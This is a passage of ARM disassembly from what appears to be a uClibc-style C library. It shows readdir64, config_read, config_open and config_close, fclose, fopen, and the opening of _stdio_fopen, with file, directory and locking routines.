   1ae50:	e5862014 	str	r2, [r6, #20]
   1ae54:	e586c018 	str	ip, [r6, #24]
   1ae58:	e586e01c 	str	lr, [r6, #28]
   1ae5c:	e8bd4070 	pop	{r4, r5, r6, lr}
   1ae60:	e12fff1e 	bx	lr

0001ae64 <__GI_readdir64>:
   1ae64:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   1ae68:	e59f60cc 	ldr	r6, [pc, #204]	; 1af3c <__GI_readdir64+0xd8>
   1ae6c:	e59f30cc 	ldr	r3, [pc, #204]	; 1af40 <__GI_readdir64+0xdc>
   1ae70:	e08f6006 	add	r6, pc, r6
   1ae74:	e24dd014 	sub	sp, sp, #20
   1ae78:	e2804018 	add	r4, r0, #24
   1ae7c:	e7961003 	ldr	r1, [r6, r3]
   1ae80:	e1a02004 	mov	r2, r4
   1ae84:	e59f30b8 	ldr	r3, [pc, #184]	; 1af44 <__GI_readdir64+0xe0>
   1ae88:	e1a05000 	mov	r5, r0
   1ae8c:	e1a0000d 	mov	r0, sp
   1ae90:	e796c003 	ldr	ip, [r6, r3]
   1ae94:	e1a0e00f 	mov	lr, pc
   1ae98:	e12fff1c 	bx	ip
   1ae9c:	e1a00004 	mov	r0, r4
   1aea0:	e59f30a0 	ldr	r3, [pc, #160]	; 1af48 <__GI_readdir64+0xe4>
   1aea4:	e796c003 	ldr	ip, [r6, r3]
   1aea8:	e1a0e00f 	mov	lr, pc
   1aeac:	e12fff1c 	bx	ip
   1aeb0:	e3a07000 	mov	r7, #0
   1aeb4:	e995000c 	ldmib	r5, {r2, r3}
   1aeb8:	e1530002 	cmp	r3, r2
   1aebc:	8a000008 	bhi	1aee4 <__GI_readdir64+0x80>
   1aec0:	e5950000 	ldr	r0, [r5]
   1aec4:	e595100c 	ldr	r1, [r5, #12]
   1aec8:	e5952014 	ldr	r2, [r5, #20]
   1aecc:	eb000997 	bl	1d530 <__getdents64>
   1aed0:	e3500000 	cmp	r0, #0
   1aed4:	d3a04000 	movle	r4, #0
   1aed8:	da00000d 	ble	1af14 <__GI_readdir64+0xb0>
   1aedc:	e5850008 	str	r0, [r5, #8]
   1aee0:	e5857004 	str	r7, [r5, #4]
   1aee4:	e5952004 	ldr	r2, [r5, #4]
   1aee8:	e595300c 	ldr	r3, [r5, #12]
   1aeec:	e0824003 	add	r4, r2, r3
   1aef0:	e7920003 	ldr	r0, [r2, r3]
   1aef4:	e5941004 	ldr	r1, [r4, #4]
   1aef8:	e1d431b0 	ldrh	r3, [r4, #16]
   1aefc:	e594c008 	ldr	ip, [r4, #8]
   1af00:	e0833002 	add	r3, r3, r2
   1af04:	e1900001 	orrs	r0, r0, r1
   1af08:	e5853004 	str	r3, [r5, #4]
   1af0c:	e585c010 	str	ip, [r5, #16]
   1af10:	0affffe7 	beq	1aeb4 <__GI_readdir64+0x50>
   1af14:	e1a0000d 	mov	r0, sp
   1af18:	e3a01001 	mov	r1, #1
   1af1c:	e59f3028 	ldr	r3, [pc, #40]	; 1af4c <__GI_readdir64+0xe8>
   1af20:	e796c003 	ldr	ip, [r6, r3]
   1af24:	e1a0e00f 	mov	lr, pc
   1af28:	e12fff1c 	bx	ip
   1af2c:	e1a00004 	mov	r0, r4
   1af30:	e28dd014 	add	sp, sp, #20
   1af34:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   1af38:	e12fff1e 	bx	lr
   1af3c:	0000db1c 	.word	0x0000db1c
   1af40:	00000044 	.word	0x00000044
   1af44:	00000070 	.word	0x00000070
   1af48:	00000010 	.word	0x00000010
   1af4c:	0000002c 	.word	0x0000002c

0001af50 <__GI_config_read>:
   1af50:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1af54:	e2505000 	subs	r5, r0, #0
   1af58:	e24dd024 	sub	sp, sp, #36	; 0x24
   1af5c:	e58d1018 	str	r1, [sp, #24]
   1af60:	e1a08002 	mov	r8, r2
   1af64:	e1a07003 	mov	r7, r3
   1af68:	0a0000bd 	beq	1b264 <__GI_config_read+0x314>
   1af6c:	e20290ff 	and	r9, r2, #255	; 0xff
   1af70:	e2023cff 	and	r3, r2, #65280	; 0xff00
   1af74:	e1a03423 	lsr	r3, r3, #8
   1af78:	e1a02109 	lsl	r2, r9, #2
   1af7c:	e58d301c 	str	r3, [sp, #28]
   1af80:	e2823001 	add	r3, r2, #1
   1af84:	e58d2014 	str	r2, [sp, #20]
   1af88:	e58d3010 	str	r3, [sp, #16]
   1af8c:	e2082802 	and	r2, r8, #131072	; 0x20000
   1af90:	e2493001 	sub	r3, r9, #1
   1af94:	e58d200c 	str	r2, [sp, #12]
   1af98:	e58d3008 	str	r3, [sp, #8]
   1af9c:	e2082701 	and	r2, r8, #262144	; 0x40000
   1afa0:	e2083801 	and	r3, r8, #65536	; 0x10000
   1afa4:	e58d2004 	str	r2, [sp, #4]
   1afa8:	e58d3000 	str	r3, [sp]
   1afac:	e3a0b000 	mov	fp, #0
   1afb0:	e287a001 	add	sl, r7, #1
   1afb4:	e5953004 	ldr	r3, [r5, #4]
   1afb8:	e3530000 	cmp	r3, #0
   1afbc:	1a000011 	bne	1b008 <__GI_config_read+0xb8>
   1afc0:	e5953010 	ldr	r3, [r5, #16]
   1afc4:	e3530000 	cmp	r3, #0
   1afc8:	e5953008 	ldr	r3, [r5, #8]
   1afcc:	03a02051 	moveq	r2, #81	; 0x51
   1afd0:	05852010 	streq	r2, [r5, #16]
   1afd4:	e3530000 	cmp	r3, #0
   1afd8:	059d3010 	ldreq	r3, [sp, #16]
   1afdc:	05853008 	streq	r3, [r5, #8]
   1afe0:	e5950010 	ldr	r0, [r5, #16]
   1afe4:	e5953008 	ldr	r3, [r5, #8]
   1afe8:	e0800003 	add	r0, r0, r3
   1afec:	ebfff0ac 	bl	172a4 <malloc>
   1aff0:	e3500000 	cmp	r0, #0
   1aff4:	e5850004 	str	r0, [r5, #4]
   1aff8:	0a000099 	beq	1b264 <__GI_config_read+0x314>
   1affc:	e5953014 	ldr	r3, [r5, #20]
   1b000:	e3833001 	orr	r3, r3, #1
   1b004:	e5853014 	str	r3, [r5, #20]
   1b008:	e995000c 	ldmib	r5, {r2, r3}
   1b00c:	e0823003 	add	r3, r2, r3
   1b010:	e585300c 	str	r3, [r5, #12]
   1b014:	e1a0600b 	mov	r6, fp
   1b018:	e285000c 	add	r0, r5, #12
   1b01c:	e8900003 	ldm	r0, {r0, r1}
   1b020:	e0860000 	add	r0, r6, r0
   1b024:	e0661001 	rsb	r1, r6, r1
   1b028:	e5952000 	ldr	r2, [r5]
   1b02c:	eb000372 	bl	1bdfc <__GI_fgets>
   1b030:	e2504000 	subs	r4, r0, #0
   1b034:	1a000005 	bne	1b050 <__GI_config_read+0x100>
   1b038:	e285000c 	add	r0, r5, #12
   1b03c:	e8900005 	ldm	r0, {r0, r2}
   1b040:	e1a01004 	mov	r1, r4
   1b044:	ebffee21 	bl	168d0 <__GI_memset>
   1b048:	e1a06004 	mov	r6, r4
   1b04c:	ea000085 	b	1b268 <__GI_config_read+0x318>
   1b050:	e595400c 	ldr	r4, [r5, #12]
   1b054:	e0840006 	add	r0, r4, r6
   1b058:	ebffee44 	bl	16970 <__GI_strlen>
   1b05c:	e3a0100a 	mov	r1, #10
   1b060:	e0866000 	add	r6, r6, r0
   1b064:	e1a00004 	mov	r0, r4
   1b068:	eb0006e0 	bl	1cbf0 <__GI_strchr>
   1b06c:	e3500000 	cmp	r0, #0
   1b070:	0a000008 	beq	1b098 <__GI_config_read+0x148>
   1b074:	e5d03000 	ldrb	r3, [r0]
   1b078:	e2433001 	sub	r3, r3, #1
   1b07c:	e20330ff 	and	r3, r3, #255	; 0xff
   1b080:	e353005c 	cmp	r3, #92	; 0x5c
   1b084:	e5c03000 	strb	r3, [r0]
   1b088:	e2466001 	sub	r6, r6, #1
   1b08c:	1a000022 	bne	1b11c <__GI_config_read+0x1cc>
   1b090:	e2466001 	sub	r6, r6, #1
   1b094:	eaffffdf 	b	1b018 <__GI_config_read+0xc8>
   1b098:	e5953014 	ldr	r3, [r5, #20]
   1b09c:	e3530000 	cmp	r3, #0
   1b0a0:	0a00000b 	beq	1b0d4 <__GI_config_read+0x184>
   1b0a4:	e5953010 	ldr	r3, [r5, #16]
   1b0a8:	e5951008 	ldr	r1, [r5, #8]
   1b0ac:	e2833a01 	add	r3, r3, #4096	; 0x1000
   1b0b0:	e0831001 	add	r1, r3, r1
   1b0b4:	e5853010 	str	r3, [r5, #16]
   1b0b8:	e5950004 	ldr	r0, [r5, #4]
   1b0bc:	ebfff316 	bl	17d1c <realloc>
   1b0c0:	e5953008 	ldr	r3, [r5, #8]
   1b0c4:	e0803003 	add	r3, r0, r3
   1b0c8:	e585300c 	str	r3, [r5, #12]
   1b0cc:	e5850004 	str	r0, [r5, #4]
   1b0d0:	eaffffd0 	b	1b018 <__GI_config_read+0xc8>
   1b0d4:	e5951000 	ldr	r1, [r5]
   1b0d8:	e5913034 	ldr	r3, [r1, #52]	; 0x34
   1b0dc:	e3530000 	cmp	r3, #0
   1b0e0:	0a000008 	beq	1b108 <__GI_config_read+0x1b8>
   1b0e4:	e5912010 	ldr	r2, [r1, #16]
   1b0e8:	e5913018 	ldr	r3, [r1, #24]
   1b0ec:	e1520003 	cmp	r2, r3
   1b0f0:	34d20001 	ldrbcc	r0, [r2], #1
   1b0f4:	35812010 	strcc	r2, [r1, #16]
   1b0f8:	3a000004 	bcc	1b110 <__GI_config_read+0x1c0>
   1b0fc:	e1a00001 	mov	r0, r1
   1b100:	eb00051b 	bl	1c574 <__GI___fgetc_unlocked>
   1b104:	ea000001 	b	1b110 <__GI_config_read+0x1c0>
   1b108:	e1a00001 	mov	r0, r1
   1b10c:	eb0002e9 	bl	1bcb8 <__GI_fgetc>
   1b110:	e350000a 	cmp	r0, #10
   1b114:	13700001 	cmnne	r0, #1
   1b118:	1affffed 	bne	1b0d4 <__GI_config_read+0x184>
   1b11c:	e3760001 	cmn	r6, #1
   1b120:	0a00004f 	beq	1b264 <__GI_config_read+0x314>
   1b124:	e59d300c 	ldr	r3, [sp, #12]
   1b128:	e3530000 	cmp	r3, #0
   1b12c:	e595400c 	ldr	r4, [r5, #12]
   1b130:	0a000003 	beq	1b144 <__GI_config_read+0x1f4>
   1b134:	e1a00004 	mov	r0, r4
   1b138:	e1a0100a 	mov	r1, sl
   1b13c:	eb000747 	bl	1ce60 <__GI_strspn>
   1b140:	e0844000 	add	r4, r4, r0
   1b144:	e5d42000 	ldrb	r2, [r4]
   1b148:	e3520000 	cmp	r2, #0
   1b14c:	0affff98 	beq	1afb4 <__GI_config_read+0x64>
   1b150:	e5d73000 	ldrb	r3, [r7]
   1b154:	e1530002 	cmp	r3, r2
   1b158:	0affff95 	beq	1afb4 <__GI_config_read+0x64>
   1b15c:	e59d2018 	ldr	r2, [sp, #24]
   1b160:	e5950004 	ldr	r0, [r5, #4]
   1b164:	e1a0100b 	mov	r1, fp
   1b168:	e5820000 	str	r0, [r2]
   1b16c:	e59d2014 	ldr	r2, [sp, #20]
   1b170:	ebffedd6 	bl	168d0 <__GI_memset>
   1b174:	e1a0600b 	mov	r6, fp
   1b178:	ea00002d 	b	1b234 <__GI_config_read+0x2e4>
   1b17c:	e59d2018 	ldr	r2, [sp, #24]
   1b180:	e5923000 	ldr	r3, [r2]
   1b184:	e59d2008 	ldr	r2, [sp, #8]
   1b188:	e1560002 	cmp	r6, r2
   1b18c:	e7834106 	str	r4, [r3, r6, lsl #2]
   1b190:	1a000002 	bne	1b1a0 <__GI_config_read+0x250>
   1b194:	e59d3004 	ldr	r3, [sp, #4]
   1b198:	e3530000 	cmp	r3, #0
   1b19c:	1a000007 	bne	1b1c0 <__GI_config_read+0x270>
   1b1a0:	e5d73000 	ldrb	r3, [r7]
   1b1a4:	e3530000 	cmp	r3, #0
   1b1a8:	e1a00004 	mov	r0, r4
   1b1ac:	01a0100a 	moveq	r1, sl
   1b1b0:	11a01007 	movne	r1, r7
   1b1b4:	eb000704 	bl	1cdcc <__GI_strcspn>
   1b1b8:	e0844000 	add	r4, r4, r0
   1b1bc:	ea00000d 	b	1b1f8 <__GI_config_read+0x2a8>
   1b1c0:	e1a00004 	mov	r0, r4
   1b1c4:	e5d71000 	ldrb	r1, [r7]
   1b1c8:	eb0006c4 	bl	1cce0 <__GI_strchrnul>
   1b1cc:	e59d200c 	ldr	r2, [sp, #12]
   1b1d0:	e3520000 	cmp	r2, #0
   1b1d4:	e1a04000 	mov	r4, r0
   1b1d8:	1a000001 	bne	1b1e4 <__GI_config_read+0x294>
   1b1dc:	ea000005 	b	1b1f8 <__GI_config_read+0x2a8>
   1b1e0:	e2444001 	sub	r4, r4, #1
   1b1e4:	e5541001 	ldrb	r1, [r4, #-1]
   1b1e8:	e1a0000a 	mov	r0, sl
   1b1ec:	eb00067f 	bl	1cbf0 <__GI_strchr>
   1b1f0:	e3500000 	cmp	r0, #0
   1b1f4:	1afffff9 	bne	1b1e0 <__GI_config_read+0x290>
   1b1f8:	e5d42000 	ldrb	r2, [r4]
   1b1fc:	e5d73000 	ldrb	r3, [r7]
   1b200:	e1530002 	cmp	r3, r2
   1b204:	05c4b000 	strbeq	fp, [r4]
   1b208:	0a000001 	beq	1b214 <__GI_config_read+0x2c4>
   1b20c:	e3520000 	cmp	r2, #0
   1b210:	14c4b001 	strbne	fp, [r4], #1
   1b214:	e59d3000 	ldr	r3, [sp]
   1b218:	e3530000 	cmp	r3, #0
   1b21c:	0a000003 	beq	1b230 <__GI_config_read+0x2e0>
   1b220:	e1a00004 	mov	r0, r4
   1b224:	e1a0100a 	mov	r1, sl
   1b228:	eb00070c 	bl	1ce60 <__GI_strspn>
   1b22c:	e0844000 	add	r4, r4, r0
   1b230:	e2866001 	add	r6, r6, #1
   1b234:	e5d42000 	ldrb	r2, [r4]
   1b238:	e3520000 	cmp	r2, #0
   1b23c:	0a000003 	beq	1b250 <__GI_config_read+0x300>
   1b240:	e5d73000 	ldrb	r3, [r7]
   1b244:	e1530002 	cmp	r3, r2
   1b248:	11560009 	cmpne	r6, r9
   1b24c:	baffffca 	blt	1b17c <__GI_config_read+0x22c>
   1b250:	e59d201c 	ldr	r2, [sp, #28]
   1b254:	e1560002 	cmp	r6, r2
   1b258:	aa000002 	bge	1b268 <__GI_config_read+0x318>
   1b25c:	e3180601 	tst	r8, #1048576	; 0x100000
   1b260:	0affff53 	beq	1afb4 <__GI_config_read+0x64>
   1b264:	e3a06000 	mov	r6, #0
   1b268:	e1a00006 	mov	r0, r6
   1b26c:	e28dd024 	add	sp, sp, #36	; 0x24
   1b270:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1b274:	e12fff1e 	bx	lr

0001b278 <__GI_config_close>:
   1b278:	e92d4010 	push	{r4, lr}
   1b27c:	e2504000 	subs	r4, r0, #0
   1b280:	0a000007 	beq	1b2a4 <__GI_config_close+0x2c>
   1b284:	e5940000 	ldr	r0, [r4]
   1b288:	eb000019 	bl	1b2f4 <__GI_fclose>
   1b28c:	e5943014 	ldr	r3, [r4, #20]
   1b290:	e3530000 	cmp	r3, #0
   1b294:	15940004 	ldrne	r0, [r4, #4]
   1b298:	1bfff428 	blne	18340 <free>
   1b29c:	e1a00004 	mov	r0, r4
   1b2a0:	ebfff426 	bl	18340 <free>
   1b2a4:	e8bd4010 	pop	{r4, lr}
   1b2a8:	e12fff1e 	bx	lr

0001b2ac <__GI_config_open>:
   1b2ac:	e59f3038 	ldr	r3, [pc, #56]	; 1b2ec <__GI_config_open+0x40>
   1b2b0:	e59f1038 	ldr	r1, [pc, #56]	; 1b2f0 <__GI_config_open+0x44>
   1b2b4:	e08f3003 	add	r3, pc, r3
   1b2b8:	e92d4010 	push	{r4, lr}
   1b2bc:	e0831001 	add	r1, r3, r1
   1b2c0:	eb0000d7 	bl	1b624 <__GI_fopen>
   1b2c4:	e2504000 	subs	r4, r0, #0
   1b2c8:	01a00004 	moveq	r0, r4
   1b2cc:	0a000004 	beq	1b2e4 <__GI_config_open+0x38>
   1b2d0:	e3a00001 	mov	r0, #1
   1b2d4:	e3a01018 	mov	r1, #24
   1b2d8:	ebfff23f 	bl	17bdc <calloc>
   1b2dc:	e3500000 	cmp	r0, #0
   1b2e0:	15804000 	strne	r4, [r0]
   1b2e4:	e8bd4010 	pop	{r4, lr}
   1b2e8:	e12fff1e 	bx	lr
   1b2ec:	0000d6d8 	.word	0x0000d6d8
   1b2f0:	ffff7b4c 	.word	0xffff7b4c

0001b2f4 <__GI_fclose>:
   1b2f4:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1b2f8:	e5909034 	ldr	r9, [r0, #52]	; 0x34
   1b2fc:	e59f8310 	ldr	r8, [pc, #784]	; 1b614 <__GI_fclose+0x320>
   1b300:	e3590000 	cmp	r9, #0
   1b304:	e24dd004 	sub	sp, sp, #4
   1b308:	e1a05000 	mov	r5, r0
   1b30c:	e08f8008 	add	r8, pc, r8
   1b310:	1a000018 	bne	1b378 <__GI_fclose+0x84>
   1b314:	ebfffd55 	bl	1a870 <__aeabi_read_tp>
   1b318:	e5953040 	ldr	r3, [r5, #64]	; 0x40
   1b31c:	e2406e49 	sub	r6, r0, #1168	; 0x490
   1b320:	e1530006 	cmp	r3, r6
   1b324:	0a000010 	beq	1b36c <__GI_fclose+0x78>
   1b328:	e2857038 	add	r7, r5, #56	; 0x38
   1b32c:	e3a01001 	mov	r1, #1
   1b330:	e1a02007 	mov	r2, r7
   1b334:	e1a04009 	mov	r4, r9
   1b338:	e5923000 	ldr	r3, [r2]
   1b33c:	e1530004 	cmp	r3, r4
   1b340:	1a000005 	bne	1b35c <__GI_fclose+0x68>
   1b344:	e1a00004 	mov	r0, r4
   1b348:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b34c:	e1a0e00f 	mov	lr, pc
   1b350:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b354:	3afffff7 	bcc	1b338 <__GI_fclose+0x44>
   1b358:	e1a03004 	mov	r3, r4
   1b35c:	e3530000 	cmp	r3, #0
   1b360:	11a00007 	movne	r0, r7
   1b364:	1bfff9ec 	blne	19b1c <__lll_lock_wait_private>
   1b368:	e5856040 	str	r6, [r5, #64]	; 0x40
   1b36c:	e595303c 	ldr	r3, [r5, #60]	; 0x3c
   1b370:	e2833001 	add	r3, r3, #1
   1b374:	e585303c 	str	r3, [r5, #60]	; 0x3c
   1b378:	e1d530b0 	ldrh	r3, [r5]
   1b37c:	e2130040 	ands	r0, r3, #64	; 0x40
   1b380:	11a00005 	movne	r0, r5
   1b384:	1b00038f 	blne	1c1c8 <__GI_fflush_unlocked>
   1b388:	e1a0b000 	mov	fp, r0
   1b38c:	e5950004 	ldr	r0, [r5, #4]
   1b390:	ebfffaaa 	bl	19e40 <__GI___libc_close>
   1b394:	e59f327c 	ldr	r3, [pc, #636]	; 1b618 <__GI_fclose+0x324>
   1b398:	e7987003 	ldr	r7, [r8, r3]
   1b39c:	e3500000 	cmp	r0, #0
   1b3a0:	b3e0b000 	mvnlt	fp, #0
   1b3a4:	e5973008 	ldr	r3, [r7, #8]
   1b3a8:	ebfffd30 	bl	1a870 <__aeabi_read_tp>
   1b3ac:	e240ae49 	sub	sl, r0, #1168	; 0x490
   1b3b0:	e153000a 	cmp	r3, sl
   1b3b4:	e3e03000 	mvn	r3, #0
   1b3b8:	e5853004 	str	r3, [r5, #4]
   1b3bc:	0a00000f 	beq	1b400 <__GI_fclose+0x10c>
   1b3c0:	e3a01001 	mov	r1, #1
   1b3c4:	e1a02007 	mov	r2, r7
   1b3c8:	e3a04000 	mov	r4, #0
   1b3cc:	e5923000 	ldr	r3, [r2]
   1b3d0:	e1530004 	cmp	r3, r4
   1b3d4:	1a000005 	bne	1b3f0 <__GI_fclose+0xfc>
   1b3d8:	e1a00004 	mov	r0, r4
   1b3dc:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b3e0:	e1a0e00f 	mov	lr, pc
   1b3e4:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b3e8:	3afffff7 	bcc	1b3cc <__GI_fclose+0xd8>
   1b3ec:	e1a03004 	mov	r3, r4
   1b3f0:	e1530004 	cmp	r3, r4
   1b3f4:	11a00007 	movne	r0, r7
   1b3f8:	1bfff9c7 	blne	19b1c <__lll_lock_wait_private>
   1b3fc:	e587a008 	str	sl, [r7, #8]
   1b400:	e59f3210 	ldr	r3, [pc, #528]	; 1b618 <__GI_fclose+0x324>
   1b404:	e7980003 	ldr	r0, [r8, r3]
   1b408:	e59f320c 	ldr	r3, [pc, #524]	; 1b61c <__GI_fclose+0x328>
   1b40c:	e7982003 	ldr	r2, [r8, r3]
   1b410:	e5901004 	ldr	r1, [r0, #4]
   1b414:	e5923000 	ldr	r3, [r2]
   1b418:	e3510000 	cmp	r1, #0
   1b41c:	e2833001 	add	r3, r3, #1
   1b420:	e5823000 	str	r3, [r2]
   1b424:	1a000017 	bne	1b488 <__GI_fclose+0x194>
   1b428:	e5801008 	str	r1, [r0, #8]
   1b42c:	e1a07000 	mov	r7, r0
   1b430:	e5974000 	ldr	r4, [r7]
   1b434:	e3a01000 	mov	r1, #0
   1b438:	e1a02007 	mov	r2, r7
   1b43c:	e5923000 	ldr	r3, [r2]
   1b440:	e1530004 	cmp	r3, r4
   1b444:	1a000005 	bne	1b460 <__GI_fclose+0x16c>
   1b448:	e1a00004 	mov	r0, r4
   1b44c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b450:	e1a0e00f 	mov	lr, pc
   1b454:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b458:	3afffff7 	bcc	1b43c <__GI_fclose+0x148>
   1b45c:	e1a03004 	mov	r3, r4
   1b460:	e1530004 	cmp	r3, r4
   1b464:	1afffff1 	bne	1b430 <__GI_fclose+0x13c>
   1b468:	e3530001 	cmp	r3, #1
   1b46c:	da000005 	ble	1b488 <__GI_fclose+0x194>
   1b470:	e1a00007 	mov	r0, r7
   1b474:	e2811081 	add	r1, r1, #129	; 0x81
   1b478:	e3a02001 	mov	r2, #1
   1b47c:	e3a03000 	mov	r3, #0
   1b480:	e3a070f0 	mov	r7, #240	; 0xf0
   1b484:	ef000000 	svc	0x00000000
   1b488:	e1d530b0 	ldrh	r3, [r5]
   1b48c:	e2033a06 	and	r3, r3, #24576	; 0x6000
   1b490:	e3833030 	orr	r3, r3, #48	; 0x30
   1b494:	e3590000 	cmp	r9, #0
   1b498:	e1c530b0 	strh	r3, [r5]
   1b49c:	1a00001c 	bne	1b514 <__GI_fclose+0x220>
   1b4a0:	e595303c 	ldr	r3, [r5, #60]	; 0x3c
   1b4a4:	e2433001 	sub	r3, r3, #1
   1b4a8:	e3530000 	cmp	r3, #0
   1b4ac:	e585303c 	str	r3, [r5, #60]	; 0x3c
   1b4b0:	1a000017 	bne	1b514 <__GI_fclose+0x220>
   1b4b4:	e5853040 	str	r3, [r5, #64]	; 0x40
   1b4b8:	e2856038 	add	r6, r5, #56	; 0x38
   1b4bc:	e5954038 	ldr	r4, [r5, #56]	; 0x38
   1b4c0:	e3a01000 	mov	r1, #0
   1b4c4:	e1a02006 	mov	r2, r6
   1b4c8:	e5923000 	ldr	r3, [r2]
   1b4cc:	e1530004 	cmp	r3, r4
   1b4d0:	1a000005 	bne	1b4ec <__GI_fclose+0x1f8>
   1b4d4:	e1a00004 	mov	r0, r4
   1b4d8:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b4dc:	e1a0e00f 	mov	lr, pc
   1b4e0:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b4e4:	3afffff7 	bcc	1b4c8 <__GI_fclose+0x1d4>
   1b4e8:	e1a03004 	mov	r3, r4
   1b4ec:	e1530004 	cmp	r3, r4
   1b4f0:	1afffff1 	bne	1b4bc <__GI_fclose+0x1c8>
   1b4f4:	e3530001 	cmp	r3, #1
   1b4f8:	da000005 	ble	1b514 <__GI_fclose+0x220>
   1b4fc:	e2850038 	add	r0, r5, #56	; 0x38
   1b500:	e2811081 	add	r1, r1, #129	; 0x81
   1b504:	e3a02001 	mov	r2, #1
   1b508:	e3a03000 	mov	r3, #0
   1b50c:	e3a070f0 	mov	r7, #240	; 0xf0
   1b510:	ef000000 	svc	0x00000000
   1b514:	e1d530b0 	ldrh	r3, [r5]
   1b518:	e3130901 	tst	r3, #16384	; 0x4000
   1b51c:	15950008 	ldrne	r0, [r5, #8]
   1b520:	1bfff386 	blne	18340 <free>
   1b524:	e59f30ec 	ldr	r3, [pc, #236]	; 1b618 <__GI_fclose+0x324>
   1b528:	e7985003 	ldr	r5, [r8, r3]
   1b52c:	e5953008 	ldr	r3, [r5, #8]
   1b530:	e153000a 	cmp	r3, sl
   1b534:	0a00000f 	beq	1b578 <__GI_fclose+0x284>
   1b538:	e3a01001 	mov	r1, #1
   1b53c:	e1a02005 	mov	r2, r5
   1b540:	e3a04000 	mov	r4, #0
   1b544:	e5923000 	ldr	r3, [r2]
   1b548:	e1530004 	cmp	r3, r4
   1b54c:	1a000005 	bne	1b568 <__GI_fclose+0x274>
   1b550:	e1a00004 	mov	r0, r4
   1b554:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b558:	e1a0e00f 	mov	lr, pc
   1b55c:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b560:	3afffff7 	bcc	1b544 <__GI_fclose+0x250>
   1b564:	e1a03004 	mov	r3, r4
   1b568:	e1530004 	cmp	r3, r4
   1b56c:	11a00005 	movne	r0, r5
   1b570:	1bfff969 	blne	19b1c <__lll_lock_wait_private>
   1b574:	e585a008 	str	sl, [r5, #8]
   1b578:	e59f30a0 	ldr	r3, [pc, #160]	; 1b620 <__GI_fclose+0x32c>
   1b57c:	e7982003 	ldr	r2, [r8, r3]
   1b580:	e59f3090 	ldr	r3, [pc, #144]	; 1b618 <__GI_fclose+0x324>
   1b584:	e7980003 	ldr	r0, [r8, r3]
   1b588:	e5923000 	ldr	r3, [r2]
   1b58c:	e5901004 	ldr	r1, [r0, #4]
   1b590:	e2833001 	add	r3, r3, #1
   1b594:	e3510000 	cmp	r1, #0
   1b598:	e5823000 	str	r3, [r2]
   1b59c:	1a000017 	bne	1b600 <__GI_fclose+0x30c>
   1b5a0:	e5801008 	str	r1, [r0, #8]
   1b5a4:	e1a05000 	mov	r5, r0
   1b5a8:	e5954000 	ldr	r4, [r5]
   1b5ac:	e3a01000 	mov	r1, #0
   1b5b0:	e1a02005 	mov	r2, r5
   1b5b4:	e5923000 	ldr	r3, [r2]
   1b5b8:	e1530004 	cmp	r3, r4
   1b5bc:	1a000005 	bne	1b5d8 <__GI_fclose+0x2e4>
   1b5c0:	e1a00004 	mov	r0, r4
   1b5c4:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b5c8:	e1a0e00f 	mov	lr, pc
   1b5cc:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b5d0:	3afffff7 	bcc	1b5b4 <__GI_fclose+0x2c0>
   1b5d4:	e1a03004 	mov	r3, r4
   1b5d8:	e1530004 	cmp	r3, r4
   1b5dc:	1afffff1 	bne	1b5a8 <__GI_fclose+0x2b4>
   1b5e0:	e3530001 	cmp	r3, #1
   1b5e4:	da000005 	ble	1b600 <__GI_fclose+0x30c>
   1b5e8:	e1a00005 	mov	r0, r5
   1b5ec:	e2811081 	add	r1, r1, #129	; 0x81
   1b5f0:	e3a02001 	mov	r2, #1
   1b5f4:	e3a03000 	mov	r3, #0
   1b5f8:	e3a070f0 	mov	r7, #240	; 0xf0
   1b5fc:	ef000000 	svc	0x00000000
   1b600:	eb000244 	bl	1bf18 <_stdio_openlist_dec_use>
   1b604:	e1a0000b 	mov	r0, fp
   1b608:	e28dd004 	add	sp, sp, #4
   1b60c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1b610:	e12fff1e 	bx	lr
   1b614:	0000d680 	.word	0x0000d680
   1b618:	000000a0 	.word	0x000000a0
   1b61c:	0000000c 	.word	0x0000000c
   1b620:	00000050 	.word	0x00000050

0001b624 <__GI_fopen>:
   1b624:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1b628:	e3a02000 	mov	r2, #0
   1b62c:	e24dd004 	sub	sp, sp, #4
   1b630:	e3e03000 	mvn	r3, #0
   1b634:	eb000002 	bl	1b644 <_stdio_fopen>
   1b638:	e28dd004 	add	sp, sp, #4
   1b63c:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1b640:	e12fff1e 	bx	lr

0001b644 <_stdio_fopen>:
   1b644:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   1b648:	e5d1c000 	ldrb	ip, [r1]
   1b64c:	e59f841c 	ldr	r8, [pc, #1052]	; 1ba70 <_stdio_fopen+0x42c>
   1b650:	e35c0072 	cmp	ip, #114	; 0x72
   1b654:	e08f8008 	add	r8, pc, r8
   1b658:	e24dd010 	sub	sp, sp, #16
   1b65c:	e1a07000 	mov	r7, r0
   1b660:	e1a05002 	mov	r5, r2
   1b664:	e1a06003 	mov	r6, r3
   1b668:	0a000012 	beq	1b6b8 <_stdio_fopen+0x74>
   1b66c:	e35c0077 	cmp	ip, #119	; 0x77
   1b670:	059f43fc 	ldreq	r4, [pc, #1020]	; 1ba74 <_stdio_fopen+0x430>
   1b674:	0a000010 	beq	1b6bc <_stdio_fopen+0x78>
   1b678:	e35c0061 	cmp	ip, #97	; 0x61
   1b67c:	059f43f4 	ldreq	r4, [pc, #1012]	; 1ba78 <_stdio_fopen+0x434>
   1b680:	0a00000d 	beq	1b6bc <_stdio_fopen+0x78>
   1b684:	e59f23f0 	ldr	r2, [pc, #1008]	; 1ba7c <_stdio_fopen+0x438>
